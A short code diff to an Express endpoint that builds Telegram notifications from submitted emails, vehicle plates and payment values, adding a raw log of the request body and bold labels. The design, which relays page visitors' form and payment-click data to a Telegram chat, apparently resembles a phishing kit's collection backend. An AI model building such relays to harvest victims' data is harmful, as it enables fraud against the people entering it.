@@ -1,5 +1,6 @@
 app.post('/notificar', async (req, res) => {
   const datos = req.body;
+  console.log("📩 Datos recibidos:", datos); // ← Para ver los datos en los logs
 
   let mensaje = "";
 
@@ -22,9 +23,9 @@ app.post('/notificar', async (req, res) => {
   } else if (datos.tipo === "pago") {
     mensaje = `
 🟡 *Clic en Pagar*
-📧 Correo: ${datos.correo || 'N/A'}
-🚗 Placa: ${datos.placa || 'N/A'}
-💵 Valor: ${datos.valor || '$0'}
+📧 *Correo:* ${datos.correo || 'N/A'}
+🚗 *Placa:* ${datos.placa || 'N/A'}
+💵 *Valor:* ${datos.valor || '$0'}
 `.trim();
 
   // 📥 Envío de formulario completo
@@ -66,3 +67,4 @@ app.post('/notificar', async (req, res) => {
     res.status(500).json({ ok: false, msg: 'Error enviando a Telegram' });
   }
 });
+
